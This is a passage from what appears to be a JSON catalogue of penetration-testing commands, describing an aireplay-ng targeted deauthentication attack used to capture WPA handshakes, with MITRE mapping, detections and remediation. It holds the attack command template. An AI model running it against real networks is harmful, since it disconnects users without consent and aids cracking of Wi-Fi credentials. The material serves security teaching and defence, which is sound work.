  {
    "id": "aireplay-deauth",
    "tool": "aircrack-ng",
    "category": "wireless",
    "phase": 6,
    "os": [
      "linux"
    ],
    "command": "aireplay-ng --deauth 10 -a <AP_BSSID> -c <CLIENT_MAC> wlan0mon",
    "name": "Targeted Deauthentication",
    "description": "Sends deauth frames to disconnect a specific client \u2014 forces handshake recapture.",
    "arguments": {
      "--deauth 10": "Send 10 deauth frames",
      "-a": "AP BSSID",
      "-c": "Client MAC"
    },
    "expected_output": "Sending DeAuth to station -- STMAC: [CC:DD:EE:FF:00:11]",
    "use_case": "Force client reconnection to capture WPA handshake.",
    "prerequisites": [
      "Monitor mode",
      "Target AP and client MACs known"
    ],
    "mitre_mapping": [
      "T1498"
    ],
    "mitre_tactic": "Impact",
    "detections": [
      "Deauth frames in WIDS",
      "Client disconnection events"
    ],
    "remediation": [
      "802.11w (management frame protection)",
      "WIDS"
    ],
    "common_mistakes": [
